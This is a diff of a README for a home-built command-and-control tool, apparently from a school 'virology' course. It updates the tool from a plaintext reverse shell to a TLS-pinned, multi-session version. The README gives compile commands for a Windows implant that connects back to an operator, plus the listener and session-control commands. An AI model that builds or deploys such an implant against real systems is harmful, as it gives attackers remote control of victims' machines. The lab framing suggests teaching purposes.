@@ -16,36 +16,42 @@ s0P0wn3d is a from-scratch C2 system with two components:
 | `implant/`   | C (Win32)| Runs on the target, connects back to the controller |
 | `controller/`| Python 3 | Operator side: listens, manages sessions, issues commands |
 
-Current status: **v0.1 "brut"** - raw reverse shell over plaintext TCP.
-Known weaknesses of v0.1 are documented in the source headers and in
-`docs/ARCHITECTURE.md`; each is a roadmap item, not an oversight.
+Current status: **v0.2** - reverse shell over TLS (asymmetric, certificate-pinned) with length-prefixed framing and a multi-session controller. v0.1's plaintext channel and its other known weaknesses are documented in the source headers and `docs/ARCHITECTURE.md`; each is a roadmap item, not an oversight.
 
 ## Install
 
-Controller (Linux/macOS/WSL, Python ≥ 3.10, stdlib only):
+Controller (Windows/Linux/macOS, Python ≥ 3.10, stdlib only):
 
 ```sh
 git clone <repo-url> && cd T-SEC-901-PAR-9-1-virology-12
-python3 controller/s0p0wn3d.py --help
+python controller/s0p0wn3d.py --help
 ```
 
-Implant (cross-compile from WSL/Linux for the Windows target):
+Generate the PKI (Git Bash / WSL / Linux, needs openssl):
 
 ```sh
-sudo apt-get install -y gcc-mingw-w64-x86-64   # once
-# edit C2_HOST / C2_PORT in implant/implant.c first
-x86_64-w64-mingw32-gcc -Os -o implant.exe implant/implant.c -lws2_32
+bash tools/make_certs.sh        # certs/ + implant/cert_pin.h
+```
+
+Implant (cross-compile from WSL, or native Windows WinLibs gcc):
+
+```sh
+x86_64-w64-mingw32-gcc -Os -o implant.exe implant/implant.c implant/tls_schannel.c -lws2_32 -lsecur32 -lbcrypt -lcrypt32
+# or natively:
+gcc -Os -o implant.exe implant/implant.c implant/tls_schannel.c -lws2_32 -lsecur32 -lbcrypt -lcrypt32
+# edit C2_HOST / C2_PORT in implant/implant.c first (defaults: lab VMnet1)
 ```
 
 ## Use
 
 ```sh
 # 1. Operator machine:
-python3 controller/s0p0wn3d.py --host 0.0.0.0 --port 4444
+python controller/s0p0wn3d.py --host 0.0.0.0 --port 4444
 
 # 2. Windows lab VM (same host-only network):
 #    copy implant.exe over and run it
-# 3. You get an interactive cmd.exe session in the controller.
+# 3. Session appears; controller commands:
+#    sessions | use <id> | back | kill <id> | exit
 ```
 
 Full walkthrough, including Wireshark proof and VM setup:
